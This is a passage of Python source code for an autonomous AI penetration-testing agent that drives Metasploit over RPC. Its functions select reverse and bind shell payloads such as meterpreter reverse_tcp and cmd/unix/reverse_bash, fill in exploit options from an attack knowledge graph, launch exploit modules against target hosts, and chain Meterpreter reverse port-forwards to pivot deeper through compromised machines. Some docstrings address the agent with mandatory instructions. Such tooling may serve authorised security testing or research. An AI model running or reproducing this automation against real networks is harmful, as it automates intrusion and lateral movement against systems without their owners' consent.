                elif "python" in raw_platform:                       mod_platform = "python"
                if "x86_64" in raw_arch or "x64" in raw_arch or "x86_64" in raw_targets or "x64" in raw_targets:
                    mod_arch = "x64"
                elif "x86" in raw_arch or "i386" in raw_arch or "x86" in raw_targets or "i386" in raw_targets:
                    mod_arch = "x86"
                elif "arm64" in raw_arch or "aarch64" in raw_arch or "arm64" in raw_targets or "aarch64" in raw_targets:
                    mod_arch = "arm64"
                elif "arm" in raw_arch or "arm" in raw_targets:
                    mod_arch = "arm"
        except Exception:
            mod_platform = ""
            mod_arch = ""
            has_native_arch = False

        # Genera payload nativi se l'arch o i target del modulo includono architetture native
        if has_native_arch and mod_platform and mod_platform not in ("php", "python"):
            archs = ["x64", "x86"]
            generated: list[str] = []
            for arch in archs:
                generated += [
                    f"{mod_platform}/{arch}/meterpreter/reverse_tcp",
                    f"{mod_platform}/{arch}/shell_reverse_tcp",
                    f"{mod_platform}/{arch}/shell_bind_tcp",
                    f"{mod_platform}/{arch}/meterpreter/bind_tcp",
                ]
            compat_payloads = generated + compat_payloads
        elif mod_platform == "php":
            compat_payloads = ["php/meterpreter/reverse_tcp", "php/shell_reverse_tcp"] + compat_payloads
        elif mod_platform == "python":
            compat_payloads = ["python/meterpreter/reverse_tcp", "python/shell_reverse_tcp"] + compat_payloads

    return compat_payloads

def msf_get_best_payload(
    module_path: str,
    banner: str = "",
    target_os: str = "",
    target_arch: str = "",
    prefer_meterpreter: bool = True,
) -> str:
    """
    Payload selection tool for the CODER agent.
    Queries Metasploit RPC for compatible payloads and ranks them into two distinct sections:
      - 'suggested_payload' and 'top_candidates': primary reverse payloads (recommended for direct and 1-hop access).
      - 'bind_candidates': alternative bind payloads (for deep pivots or isolated subnets unable to reach LHOST).
    Includes 'guidance' (in English) explaining when to use each payload category.
    """
    if not module_path.startswith("exploit/"):
        return json.dumps({
            "status": "error",
            "message": f"Module '{module_path}' rejected: only exploit/ modules are supported."
        })

    compat_payloads = _get_effective_compat_payloads(module_path)

    result = _smart_select_payload(
        compat_payloads,
        module_path,
        banner=banner,
        target_os=target_os,
        target_arch=target_arch,
        prefer_meterpreter=prefer_meterpreter,
    )
    result["status"] = "ok"
    result["compat_count"] = len(compat_payloads)
    return json.dumps(result)


def msf_get_module_info(module_path: str) -> str:
    """
    Introspection tool for the CODER agent.
    Queries Metasploit RPC for comprehensive metadata, description, required/available options,
    default values, and target architectures of an exploit module.

    Args:
        module_path: Full path of the Metasploit module (e.g. 'exploit/unix/webapp/drupal_drupalgeddon2').

    Returns:
        JSON string containing module metadata (name, description, rank, references/CVEs, targets, default_target, required_options, and key available_options).
    """
    if module_path.startswith("exploit/"):
        mtype = "exploit"
        clean_mod = module_path.replace("exploit/", "", 1)
    elif module_path.startswith("auxiliary/"):
        mtype = "auxiliary"
        clean_mod = module_path.replace("auxiliary/", "", 1)
    elif module_path.startswith("post/"):
        mtype = "post"
        clean_mod = module_path.replace("post/", "", 1)
    else:
        return json.dumps({
            "status": "error",
            "message": f"Module '{module_path}' rejected: only exploit/, auxiliary/, and post/ modules are supported."
        })

    client = msf_client
    try:
        info = client.call("module.info", mtype, clean_mod)

        if not info or not isinstance(info, dict) or "error" in info:
            err_msg = info.get("error", "Module not found") if isinstance(info, dict) else "Not found"
            return json.dumps({
                "status": "error",
                "message": f"Failed to retrieve module info for '{module_path}': {err_msg}"
            })
    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": f"RPC error fetching module info for '{module_path}': {str(e)}"
        })

    # Clean and filter options to keep output concise and useful
    all_options = info.get("options", {})
    required_options = {}
    available_options = {}

    for opt_name, opt_meta in all_options.items():
        if not isinstance(opt_meta, dict):
            continue
        # Skip internal/evasion noise
        if any(opt_name.startswith(prefix) for prefix in ["HTTP::", "EXE::", "MSI::", "WfsDelay", "CPORT", "CHOST"]):
            continue

        entry = {
            "type": opt_meta.get("type", "string"),
            "desc": opt_meta.get("desc", ""),
        }
        if "default" in opt_meta:
            entry["default"] = opt_meta["default"]

        if opt_meta.get("required", False):
            required_options[opt_name] = entry
        elif not opt_meta.get("advanced", False) or opt_name in ("SSL", "VHOST", "TARGETURI", "WritableDir", "PHP_FUNC", "HTTP_METHOD"):
            available_options[opt_name] = entry

    # Extract clean references (CVEs, URLs)
    refs = []
    for r in info.get("references", []):
        if isinstance(r, (list, tuple)) and len(r) >= 2:
            refs.append(f"{r[0]}-{r[1]}" if r[0] == "CVE" else f"{r[0]}: {r[1]}")
        elif isinstance(r, str):
            refs.append(r)

    clean_summary = {
        "status": "ok",
        "module_path": module_path,
        "name": info.get("name", ""),
        "rank": info.get("rank", "normal"),
        "description": info.get("description", "").strip(),
        "references": refs[:5],
        "default_target": info.get("default_target", 0),
        "targets": info.get("targets", {}),
        "required_options": required_options,
        "available_options": available_options,
    }

    return json.dumps(clean_summary, indent=2)


def _get_akg_service_properties(host_ip: str, port: int) -> dict:
    """
    Retrieve service node properties from the active AKG graph for a given host and port.
    """
    try:
        from core.knowledge_graph import get_graph
        g = get_graph()
        canonical_host_id = g._resolve_canonical_host_id(host_ip)
        canonical_ip = canonical_host_id.replace("host-", "")
        nid = f"svc-{canonical_ip}-{port}"
        node = g._nodes.get(nid)
        if node and node.type == "Service":
            return dict(node.properties)

        # Fallback: scan for any service matching the port on matching host
        for n in g._nodes.values():
            if n.type == "Service":
                np = n.properties
                if int(np.get("port", -1)) == int(port):
                    if f"-{canonical_ip}-" in n.id or f"-{host_ip}-" in n.id:
                        return dict(np)
    except Exception:
        pass
    return {}


def _score_candidate_uri(candidate: str, module_path: str, opt_desc: str, opt_default: str, web_path: str = "") -> int:
    """
    Universally scores a candidate URI against a Metasploit module option definition and module path.
    Evaluates expected file extensions, directory keywords, application context path, and base-path requirements.
    """
    cand_lower = candidate.lower()
    desc_lower = (opt_desc or "").lower()
    def_lower = (opt_default or "").lower()
    mod_lower = (module_path or "").lower()

    full_context = f"{mod_lower} {desc_lower} {def_lower}"
    desc_tokens = set(re.findall(r"[a-z0-9_]+", full_context))

    # Detect if option expects a specific endpoint/extension/action
    extensions = set(re.findall(r"\.([a-z0-9_]{2,5})\b", def_lower + " " + desc_lower))
    if any("action" in tok or "struts" in tok for tok in desc_tokens):
        extensions.add("action")
    if any("cgi" in tok or "bash_env" in tok or "shellshock" in tok for tok in desc_tokens):
        extensions.add("cgi")
        extensions.add("sh")
        extensions.add("pl")
    if any("jsp" in tok or "tomcat" in tok for tok in desc_tokens):
        extensions.add("jsp")
    if any("php" in tok or "phpmailer" in tok for tok in desc_tokens):
        extensions.add("php")

    dir_keywords = [k for k in ["cgi-bin", "bin", "scripts", "api", "rest"] if k in full_context]
    is_base_path = (def_lower in ["/", ""]) and not extensions and not dir_keywords

    score = 0

    # Match application keywords from module path (e.g. "geoserver", "drupal", "wordpress")
    mod_app_tokens = [t for t in re.findall(r"[a-z0-9_]{4,}", mod_lower) if t not in ["exploit", "multi", "unix", "linux", "windows", "http", "unauth", "admin", "rce", "cve"]]
    if any(tok in cand_lower for tok in mod_app_tokens):
        score += 25

    # Match discovered service web_path context root
    if web_path:
        norm_wp = web_path.lower().strip("/")
        norm_cand = cand_lower.strip("/")
        if norm_wp and (norm_cand == norm_wp or norm_cand.startswith(norm_wp)):
            if not (is_base_path and any(cand_lower.split("?")[0].endswith(ext) for ext in [".html", ".htm", ".json", ".xml", ".txt", ".js", ".css"])):
                score += 20

    if extensions:
        cand_ext = cand_lower.split(".")[-1] if "." in cand_lower else ""
        if cand_ext in extensions:
            score += 15
        elif any(ext in cand_lower for ext in extensions):
            score += 10
        elif cand_ext:
            score -= 5

    if dir_keywords:
        if any(dk in cand_lower for dk in dir_keywords):
            score += 10

    if any(vk in cand_lower for vk in ["vulnerab", "vuln", "exploit", "showcase"]):
        score += 5

    if is_base_path:
        if any(cand_lower.split("?")[0].endswith(ext) for ext in [".html", ".htm", ".json", ".xml", ".txt", ".js", ".css"]):
            score -= 30
        if cand_lower == "/":
            score += 10
        elif any(sub in cand_lower for sub in ["/user", "/login", "/admin", "/batch", "/core", "/rss", "/favicon"]):
            score -= 8
    else:
        # If an endpoint is expected, a root path "/" is not ideal
        if cand_lower == "/":
            score -= 5

    return score


def _score_module_target(tid: str, tname: str, target_os: str, target_arch: str, chosen_payload: str = "") -> int:
    """
    Universally scores a Metasploit module target index against target OS, architecture, and chosen payload.
    """
    tname_l = str(tname).lower()
    score = 0

    norm_arch = "x64" if any(k in target_arch or k in chosen_payload for k in ["64", "x64", "x86_64", "amd64"]) else ("x86" if any(k in target_arch or k in chosen_payload for k in ["32", "x86", "i386", "i686"]) else "")
    norm_os = "linux" if "linux" in target_os or "unix" in target_os else ("windows" if "win" in target_os else target_os)

    # 1. OS Matching
    if norm_os:
        if norm_os in tname_l or ("unix" in norm_os and "linux" in tname_l):
            score += 10
        elif any(other_os in tname_l for other_os in ["windows", "macos", "solaris", "bsd"]) and norm_os not in tname_l:
            score -= 20

    # 2. Architecture Matching
    if norm_arch == "x64":
        if any(tok in tname_l for tok in ["64", "x64", "x86_64", "amd64"]):
            score += 20
        elif any(tok in tname_l for tok in ["32", "x86", "i386", "i686"]):
            score -= 10
    elif norm_arch == "x86":
        if any(tok in tname_l for tok in ["32", "x86", "i386", "i686"]) and not any(tok in tname_l for tok in ["64", "x64", "x86_64"]):
            score += 20
        elif any(tok in tname_l for tok in ["64", "x64", "x86_64", "amd64"]):
            score -= 10

    # 3. Automatic/Generic fallback
    if "auto" in tname_l or "generic" in tname_l:
        score += 2

    return score


def _resolve_exploit_parameters(module_path: str, rhosts: str, rport: int, extra_options: dict | None = None, chosen_payload: str = "") -> dict:
    """
    Dynamically maps and resolves module options (such as TARGETURI, TARGET, SSL, VHOST)
    by inspecting Metasploit module definitions and matching them with the Attack Knowledge Graph (AKG) state.
    """
    clean_mod = module_path.replace("exploit/", "", 1)
    extra = dict(extra_options) if extra_options else {}
    if chosen_payload:
        extra.setdefault("payload", chosen_payload)

    # Extract primary host
    first_host = rhosts.replace(",", " ").split()[0] if rhosts.strip() else "127.0.0.1"
    if "/" in first_host:
        first_host = first_host.split("/")[0]
    if "-" in first_host:
        first_host = first_host.split("-")[0]

    svc_props = _get_akg_service_properties(first_host, rport)

    discovered_paths: list[str] = svc_props.get("discovered_paths", [])
    web_path: str = svc_props.get("web_path", "")
    target_os: str = (extra.get("_target_os") or svc_props.get("target_os") or "").lower()
    target_arch: str = (extra.get("_target_arch") or svc_props.get("target_arch") or "").lower()
    chosen_payload: str = (extra.get("payload") or "").lower()
    is_ssl: bool = bool(svc_props.get("ssl") or (rport in (443, 8443)))
    svc_attributes: dict = svc_props.get("attributes", {}) if isinstance(svc_props.get("attributes"), dict) else {}

    resolved_options = {}

    # 1. Query MSF module options and info
    mod_options = {}
    mod_info = {}
    try:
        opt_res = msf_client.call("module.options", "exploit", clean_mod)
        if isinstance(opt_res, dict) and "error" not in opt_res:
            mod_options = opt_res
    except Exception:
        pass

    try:
        info_res = msf_client.call("module.info", "exploit", clean_mod)
        if isinstance(info_res, dict) and "error" not in info_res:
            mod_info = info_res
    except Exception:
        pass

    # Normalize option names available in module
    available_opts_upper = {k.upper(): k for k in mod_options.keys()}

    # 2. Universal TARGETURI / URI / PATH resolution
    uri_param_key = None
    for candidate in ["TARGETURI", "URI", "PATH", "URIPATH"]:
        if candidate in available_opts_upper:
            uri_param_key = available_opts_upper[candidate]
            break

    already_has_uri = any(k.upper() in ["TARGETURI", "URI", "PATH", "URIPATH"] for k in extra.keys())

    if uri_param_key and not already_has_uri:
        opt_meta = mod_options.get(uri_param_key, {})
        opt_desc = opt_meta.get("desc", "")
        opt_default = str(opt_meta.get("default") or "")

        # Pool of candidate paths
        candidate_pool = []
        if web_path:
            candidate_pool.append(web_path)
        for p in discovered_paths:
            if p not in candidate_pool:
                candidate_pool.append(p)
        if "/" not in candidate_pool:
            candidate_pool.append("/")

        # Score candidates universally
        scored_candidates = [
            (p, _score_candidate_uri(p, module_path, opt_desc, opt_default, web_path=web_path))
            for p in candidate_pool
        ]
        scored_candidates.sort(key=lambda x: x[1], reverse=True)

        best_uri = scored_candidates[0][0] if scored_candidates else (opt_default or "/")
        if not best_uri.startswith("/") and not best_uri.startswith("http"):
            best_uri = "/" + best_uri
        resolved_options[uri_param_key] = best_uri

    # 3. Universal TARGET (Target index selection) resolution
    # If explicitly set by caller, always honour it.
    # If the target is behind a pivot, automatically prefer an in-memory target
    # (avoids dropper targets that require the victim to reach Kali via HTTP).
    caller_set_target = "TARGET" in [k.upper() for k in extra.keys()]
    if caller_set_target:
        target_param_key = available_opts_upper.get("TARGET", "TARGET")
        resolved_options[target_param_key] = str(extra[[k for k in extra.keys() if k.upper() == "TARGET"][0]])
    elif extra.get("_is_pivot") or extra.get("_pivot_auto_target"):
        # Pivot path: try to select an in-memory target automatically
        pivot_target_idx = _select_pivot_target_index(module_path)
        if pivot_target_idx is not None:
            resolved_options[available_opts_upper.get("TARGET", "TARGET")] = pivot_target_idx

    # 4. SSL resolution
    if "SSL" in available_opts_upper and "SSL" not in [k.upper() for k in extra.keys()]:
        ssl_param_key = available_opts_upper["SSL"]
        if is_ssl:
            resolved_options[ssl_param_key] = "true"

    # 5. WEB_ROOT / DOCROOT resolution
    web_root_key = None
    for candidate in ["WEB_ROOT", "DOCROOT", "DOCUMENT_ROOT"]:
        if candidate in available_opts_upper:
            web_root_key = available_opts_upper[candidate]
            break

    if web_root_key and not any(k.upper() in ["WEB_ROOT", "DOCROOT", "DOCUMENT_ROOT"] for k in extra.keys()):
        if "web_root" in svc_attributes:
            resolved_options[web_root_key] = svc_attributes["web_root"]
        elif "phpmailer" in module_path.lower():
            resolved_options[web_root_key] = "/www"

    return resolved_options


def _check_target_pivot_status(target_ip: str) -> tuple[bool, str]:
    """
    Checks if target_ip is on an internal subnet that requires an active pivot session.
    If the target is internal and the required pivot session or route is missing/dead,
    returns (False, error_message) so the agent can fail-fast and restore sessions.
    Otherwise returns (True, "").
    """
    try:
        import ipaddress
        from core.knowledge_graph import get_graph
        from core.rpc_client import msf_client

        g = get_graph()
        # If Metasploit / attacker container is directly attached to the target subnet, no pivot is required
        if _resolve_docker_lhost(target_ip):
            return True, ""

        try:
            target_addr = ipaddress.ip_address(target_ip)
        except ValueError:
            return True, ""

        # Check if target belongs to a non-attacker internal subnet
        target_subnet_node = None
        has_pivot_edge = False
        for n in g._nodes.values():
            if n.type == "Subnet":
                cidr = n.properties.get("cidr", "")
                if cidr:
                    try:
                        net = ipaddress.ip_network(cidr, strict=False)
                        if target_addr in net:
                            if not n.properties.get("is_attacker_network", False):
                                target_subnet_node = n
                                break
                    except Exception:
                        pass

        if not target_subnet_node:
            return True, ""

        # Only require pivot if graph explicitly records a PIVOTS_INTO edge to this subnet
        for edge in g._edges.values():
            if edge.type == "PIVOTS_INTO" and edge.to_node == target_subnet_node.id:
                has_pivot_edge = True
                break

        if not has_pivot_edge:
            return True, ""

        cidr_str = target_subnet_node.properties.get("cidr", "")
        net_prefix = cidr_str.split("/")[0]

        # Check if Metasploit has active sessions
        raw_sessions = msf_client.call("session.list")
        if not isinstance(raw_sessions, dict) or "error" in raw_sessions or not raw_sessions:
            return False, (
                f"Target '{target_ip}' is on internal subnet '{cidr_str}', but Metasploit currently has NO active sessions. "
                f"The pivot chain is broken. Call `akg_restore_sessions()` to restore all upstream sessions and routes before exploiting."
            )

        # Normalize session keys to string
        sessions = {str(k): v for k, v in raw_sessions.items() if isinstance(v, dict)}

        # 1. Primary check: Does ANY active session already route this subnet?
        for sid, sinfo in sessions.items():
            routes_str = str(sinfo.get("routes", ""))
            if net_prefix in routes_str:
                return True, ""

        # 2. Secondary check: Find expected pivot gateway session from PIVOTS_INTO edges or ExploitSteps
        expected_session_id = None
        for edge in g._edges.values():
            if edge.type == "PIVOTS_INTO" and edge.to_node == target_subnet_node.id:
                expected_session_id = edge.properties.get("via_session_id") or edge.properties.get("session_id")
                if not expected_session_id:
                    exp_node = g._nodes.get(edge.from_node)
                    if exp_node and exp_node.type == "ExploitStep":
                        expected_session_id = exp_node.properties.get("session_id")
                break

        # Also find any active session on the host that connects to this subnet
        pivot_host_ips = set()
        for edge in g._edges.values():
            if edge.type == "CONNECTS_TO" and edge.to_node == target_subnet_node.id:
                iface_node = g._nodes.get(edge.from_node)
                if iface_node:
                    for h_edge in g._edges.values():
                        if h_edge.type == "HAS_INTERFACE" and h_edge.to_node == iface_node.id:
                            h_node = g._nodes.get(h_edge.from_node)
                            if h_node and "ip" in h_node.properties:
                                pivot_host_ips.add(h_node.properties["ip"])

        candidate_sid = None
        if expected_session_id and str(expected_session_id) in sessions:
            candidate_sid = str(expected_session_id)
        else:
            for sid, sinfo in sessions.items():
                shost = str(sinfo.get("target_host") or sinfo.get("session_host") or "")
                if shost in pivot_host_ips:
                    candidate_sid = sid
                    break

        # If a candidate session exists on the pivot host, try to auto-heal / attach the route
        if candidate_sid:
            try:
                from core.postexploit_tools import msf_add_route
                parts = cidr_str.split("/")
                if len(parts) == 2:
                    netmask = str(ipaddress.IPv4Network(f"0.0.0.0/{int(parts[1])}").netmask)
                    msf_add_route(int(candidate_sid), parts[0], netmask)
                    # Verify route is now present in session.list
                    verify_sess = msf_client.call("session.list")
                    if isinstance(verify_sess, dict) and candidate_sid in verify_sess:
                        if net_prefix in str(verify_sess[candidate_sid].get("routes", "")):
                            return True, ""
            except Exception:
                pass

        # 3. Fallback check: check if any active session is directly on an interface attached to this subnet
        for sid, sinfo in sessions.items():
            session_ip = str(sinfo.get("session_host") or sinfo.get("target_host") or "")
            if session_ip:
                try:
                    s_addr = ipaddress.ip_address(session_ip)
                    if s_addr in ipaddress.ip_network(cidr_str, strict=False):
                        return True, ""
                except Exception:
                    pass

        return False, (
            f"route not present: Target '{target_ip}' is on internal subnet '{cidr_str}', but no active Metasploit session is currently routing it. "
            f"The pivot route is missing. Re-establish the pivot route (e.g. via msf_add_route or akg_restore_sessions)."
        )
    except Exception:
        return True, ""


def msf_trigger_exploit_auto(module_path: str, rhosts: str, rport: int) -> str:
    """
    Automated exploit tool for the CODER agent.
    Takes module_path, rhosts, and the required target rport.
    Leaves the payload unset (so Metasploit selects its verified default)
    and passes no extra_options.

    MANDATORY: You MUST call this tool ONCE on your first exploit attempt before
    attempting msf_trigger_exploit.

    Args:
        module_path: Exploit module path (e.g. 'exploit/multi/http/geoserver_unauth_rce_cve_2024_36401').
        rhosts:      Target IP address (e.g. '192.168.5.0').
        rport:       Target port discovered for this service (e.g. 8080). MANDATORY.
    """
    if not module_path.startswith("exploit/"):
        module_path = f"exploit/{module_path}"

    return msf_trigger_exploit(
        module_path=module_path,
        rhosts=rhosts,
        rport=int(rport),
        payload="",
        extra_options={}
    )


def _setup_portfwd_chain_internal(
    target_ip: str,
    forward_to_port: int,
    forward_to_host: str = "127.0.0.1",
) -> dict | None:
    """
    Internal helper — NOT exposed as an agent tool.

    Finds the Meterpreter pivot session whose host has an IP directly on
    target_ip's subnet, then runs `portfwd add -R` so that a reverse payload
    from that target can call back through the existing Meterpreter tunnel chain.

    Transparent to the agent at any hop depth: portfwd uses the already-tunneled
    Meterpreter channel (S3 ↔ S2 ↔ S1 ↔ MSF), so N-hop chains work automatically.

    Args:
        target_ip:        IP of the target to be exploited.
        forward_to_port:  LPORT for both the pivot listener and the MSF handler.
        forward_to_host:  Local IP to forward to on the MSF handler side (default: "127.0.0.1").

    Returns:
        {"lhost": pivot_ip_on_target_subnet, "lport": int, "session_id": str}
        or None on failure.
    """
    import ipaddress as _ip
    import time as _t

    print(f"[portfwd] Setting up reverse port-forward for target '{target_ip}' on port {forward_to_port}...")

    try:
        try:
            target_addr = _ip.ip_address(socket.gethostbyname(target_ip))
        except Exception:
            target_addr = _ip.ip_address(target_ip)

        from core.knowledge_graph import get_graph
        g = get_graph()

        # 1. Locate the target's subnet node
        target_net = None
        target_subnet_id = None
        for n in g._nodes.values():
            if n.type != "Subnet":
                continue
            cidr = n.properties.get("cidr", "")
            if not cidr:
                continue
            try:
                net = _ip.ip_network(cidr, strict=False)
                if target_addr in net:
                    target_net = net
                    target_subnet_id = n.id
                    break
            except Exception:
                pass

        if target_net is None:
            print(f"[portfwd] Warning: Could not locate subnet in graph for {target_ip}")
            return None

        # 2. Find the PIVOTS_INTO edge that opens this subnet (the nearest pivot)
        pivot_exploit_id = None
        for edge in g._edges.values():
            if edge.type == "PIVOTS_INTO" and edge.to_node == target_subnet_id:
                pivot_exploit_id = edge.from_node
                break

        if pivot_exploit_id is None:
            print(f"[portfwd] Warning: No PIVOTS_INTO edge found in graph for subnet {target_subnet_id}")
            return None

        # 3. Find the host compromised by that ExploitStep
        pivot_host_id = None
        for edge in g._edges.values():
            if edge.type == "COMPROMISES" and edge.from_node == pivot_exploit_id:
                pivot_host_id = edge.to_node
                break

        if pivot_host_id is None:
            print(f"[portfwd] Warning: No host found compromised by exploit {pivot_exploit_id}")
            return None

        # 4. Find the interface of that pivot host with an IP inside the target subnet
        # (the pivot machine is multi-homed: one IP in its parent subnet, one in target's)
        pivot_ip_on_target = None
        for edge in g._edges.values():
            if edge.type != "HAS_INTERFACE" or edge.from_node != pivot_host_id:
                continue
            iface_node = g._nodes.get(edge.to_node)
            if not iface_node or iface_node.type != "Interface":
                continue
            iface_ip = iface_node.properties.get("ip", "")
            try:
                if _ip.ip_address(iface_ip) in target_net:
                    pivot_ip_on_target = iface_ip
                    break
            except Exception:
                pass

        if pivot_ip_on_target is None:
            print(f"[portfwd] Warning: No interface on target subnet {target_net} found for pivot host {pivot_host_id}")
            return None

        # 5. Find the active Meterpreter session for this ExploitStep / Pivot Host
        raw_sessions = msf_client.call("session.list")
        if not isinstance(raw_sessions, dict) or "error" in raw_sessions:
            print(f"[portfwd] Warning: Failed to query session.list from MSF RPC: {raw_sessions}")
            return None

        sessions_dict = {str(k): v for k, v in raw_sessions.items() if isinstance(v, dict)}

        active_meterpreter_sid = None
        pivot_exploit_node = g._nodes.get(pivot_exploit_id)
        graph_session_id = pivot_exploit_node.properties.get("session_id") if pivot_exploit_node else None
        sid_str = str(graph_session_id) if graph_session_id is not None else None

        # Check candidate A: session_id from graph
        if sid_str and sid_str in sessions_dict and sessions_dict[sid_str].get("type") == "meterpreter":
            active_meterpreter_sid = sid_str
        else:
            # Candidate B: Active Meterpreter session with explicit route to target_net
            target_net_str = str(target_net.network_address)
            for s_id, s_info in sessions_dict.items():
                if s_info.get("type") == "meterpreter" and target_net_str in s_info.get("routes", ""):
                    active_meterpreter_sid = s_id
                    print(f"[portfwd] Discovered active Meterpreter session {s_id} via route '{target_net_str}'")
                    break

            # Candidate C: Active Meterpreter session on pivot host IP
            if not active_meterpreter_sid:
                pivot_host_node = g._nodes.get(pivot_host_id)
                pivot_ips = set()
                if pivot_host_node and pivot_host_node.properties.get("ip"):
                    pivot_ips.add(pivot_host_node.properties["ip"])
                for edge in g._edges.values():
                    if edge.type == "HAS_INTERFACE" and edge.from_node == pivot_host_id:
                        iface = g._nodes.get(edge.to_node)
                        if iface and iface.properties.get("ip"):
                            pivot_ips.add(iface.properties["ip"])

                for s_id, s_info in sessions_dict.items():
                    if s_info.get("type") != "meterpreter":
                        continue
                    shost = s_info.get("session_host") or s_info.get("target_host")
                    if shost in pivot_ips:
                        active_meterpreter_sid = s_id
                        print(f"[portfwd] Discovered active Meterpreter session {s_id} via pivot host IP '{shost}'")
                        break

        if not active_meterpreter_sid:
            print(f"[portfwd] Warning: No active Meterpreter session found for pivot host {pivot_host_id}")
            return None

        # Keep graph synchronized if session_id was updated/upgraded
        if pivot_exploit_node and str(pivot_exploit_node.properties.get("session_id")) != active_meterpreter_sid:
            try:
                pivot_exploit_node.properties["session_id"] = int(active_meterpreter_sid) if active_meterpreter_sid.isdigit() else active_meterpreter_sid
                pivot_exploit_node.properties["session_type"] = "meterpreter"
                g.save()
            except Exception:
                pass

        # 6. Execute portfwd add -R on the pivot session via the Meterpreter RPC channel.
        # Meterpreter reverse port forward syntax:
        #   portfwd add -R -l <local_port> -p <remote_port> -L <local_host>
        # Where:
        #   -R: reverse port forward
        #   -p <remote_port>: port opened on remote pivot machine
        #   -l <local_port>: port connecting back to MSF handler
        #   -L <local_host>: host on MSF side where handler is listening ("127.0.0.1")
        target_local_host = forward_to_host or "127.0.0.1"

        # Clear any stale relay on this port first
        msf_client.call(
            "session.meterpreter_run_single",
            active_meterpreter_sid,
            f"portfwd delete -R -p {forward_to_port} -l {forward_to_port} -L {target_local_host}",
        )
        _t.sleep(0.3)
        msf_client.call("session.meterpreter_read", active_meterpreter_sid)

        cmd = f"portfwd add -R -l {forward_to_port} -p {forward_to_port} -L {target_local_host}"
        msf_client.call("session.meterpreter_run_single", active_meterpreter_sid, cmd)
        _t.sleep(1.0)  # allow the portfwd listener to initialize
        read_res = msf_client.call("session.meterpreter_read", active_meterpreter_sid)
        read_output = read_res.get("data", "") if isinstance(read_res, dict) else ""

        print(f"[portfwd] Configured reverse relay on session {active_meterpreter_sid}: {pivot_ip_on_target}:{forward_to_port} -> {target_local_host}:{forward_to_port}")
        if read_output:
            print(f"[portfwd] Meterpreter output: {read_output.strip()}")

        return {
            "lhost": pivot_ip_on_target,
            "lport": forward_to_port,
            "session_id": active_meterpreter_sid,
        }

    except Exception as e:
        print(f"[portfwd] Unexpected error in _setup_portfwd_chain_internal: {e}")
        return None


def msf_trigger_exploit(module_path: str, rhosts: str, rport: int, payload: str = "", lhost: str = None, extra_options: Union[dict, str, None] = None) -> str:
    """
    Exploit tool for the CODER agent. Configures and runs an exploit module in Metasploit.
    Upon successful execution, returns the session_id of the opened Reverse Shell.

    Args:
        module_path:   Exploit module path (e.g. 'exploit/unix/webapp/drupal_drupalgeddon2').
        rhosts:        Target IP address.
        rport:         Target port.
        payload:       Optional Metasploit payload name (default: "").
                       MANDATORY: DO NOT provide a payload on the first attempt! Leave payload empty ("")
                       so Metasploit automatically selects its verified internal default payload for the module.
                       ONLY provide a payload if the initial exploit attempt without payload failed.
        lhost:         Optional callback IP (LHOST) for the reverse shell. If not provided,
                       it will automatically resolve the best local IP to route to the target,
                       falling back to the configured ATTACKER_LHOST.
        extra_options: Optional dict (or JSON string) of additional module options to set before execution
                       (e.g. {'TARGETURI': '/'}).
                       MANDATORY FOR WEB EXPLOITS: On your first attempt, ALWAYS use TARGETURI: '/'
                       (e.g. extra_options={'TARGETURI': '/'}), regardless of what the Orchestrator suggests.
                       These override any default values set by the module.
    """
    if isinstance(extra_options, str):
        try:
            extra_options = json.loads(extra_options)
        except Exception:
            extra_options = {}

    # Guard: rejects non-exploit modules before contacting Metasploit RPC
    if not module_path.startswith("exploit/"):
        return json.dumps({
            "status": "error",
            "message": (
                f"Module '{module_path}' rejected: msf_trigger_exploit only accepts exploit "
                f"modules starting with 'exploit/'. For scanning or recon, delegate to Scout."
            )
        })

    try:
        # Determine the best LHOST dynamically
        lhost_to_use = lhost
        compat_payloads = []

        # Parse target hosts
        target_ips, target_networks, target_hostnames = _parse_rhosts(rhosts)
        
        # Determine if target has any loopback address
        has_loopback_target = any(ip.is_loopback for ip in target_ips) or "localhost" in target_hostnames or "127.0.0.1" in target_hostnames

        # Get first host for routing test
        first_host = rhosts.replace(",", " ").split()[0] if rhosts.strip() else "127.0.0.1"
        if "/" in first_host:
            first_host = first_host.split("/")[0]
        if "-" in first_host:
            first_host = first_host.split("-")[0]

        # Pre-flight Pivot Health Check: fail-fast if target requires a missing/dead pivot session
        is_pivot_ready, pivot_err = _check_target_pivot_status(first_host)
        if not is_pivot_ready:
            return json.dumps({
                "status": "error",
                "message": pivot_err
            })

        # Detect pivot depth via BFS over the AKG's PIVOTS_INTO edges.
        # hop_count == 0: target on attacker/direct subnet
        # hop_count == 1: single autoroute hop (classic pivot — reverse_tcp works)
        # hop_count >= 2: multi-hop — reverse payloads cannot traverse double autoroute;
        #                 bind_tcp or portfwd chain required.
        hop_count = _count_pivot_hops(first_host)
        is_pivot = hop_count > 0

        # Randomize LPORT early — portfwd setup (if triggered below) must use the same port.
        import random as _rand
        _lport = str((extra_options or {}).get("LPORT") or _rand.randint(4445, 4999))

        # 1. Resolve and inject dynamic options from AKG (e.g. TARGETURI, TARGET, SSL) early.
        # Pass _is_pivot so that _resolve_exploit_parameters can auto-select
        # an in-memory target when the target is behind a pivot (avoids dropper binaries).
        _augmented_extra = dict(extra_options) if extra_options else {}
        if is_pivot and not any(k.upper() == "TARGET" for k in _augmented_extra):
            _augmented_extra["_pivot_auto_target"] = True
        resolved_params = _resolve_exploit_parameters(module_path, rhosts, rport, _augmented_extra, chosen_payload=payload or "")

        # Check if an in-memory target index was selected (e.g. TARGET=1)
        selected_target_idx = resolved_params.get("TARGET") or (extra_options or {}).get("TARGET")
        _target_payloads = []
        if selected_target_idx is not None:
            try:
                t_res = msf_client.call("module.target_compatible_payloads", module_path, int(selected_target_idx))
                if isinstance(t_res, dict) and "payloads" in t_res:
                    _target_payloads = t_res["payloads"]
            except Exception:
                pass

        # If an in-memory target is active and either no payload was given or the caller gave
        # an incompatible native binary payload (which requires dropper), auto-align to an in-memory payload:
        if selected_target_idx is not None and _target_payloads:
            if not payload or payload.strip() not in _target_payloads:
                # Find best in-memory reverse payload compatible with this target
                for cand in ["cmd/unix/reverse_bash", "cmd/unix/python/meterpreter/reverse_tcp", "cmd/unix/reverse_python", "cmd/unix/reverse_netcat"]:
                    if cand in _target_payloads:
                        payload = cand
                        print(f"[msf_trigger_exploit] Auto-aligned payload for in-memory target {selected_target_idx}: {payload}")
                        break

        # Multi-hop (>= 2): auto-select bind_tcp or in-memory reverse payload when none was given.
        if hop_count >= 2 and not payload:
            _compat_mh = _target_payloads or _get_effective_compat_payloads(module_path)
            if _compat_mh:
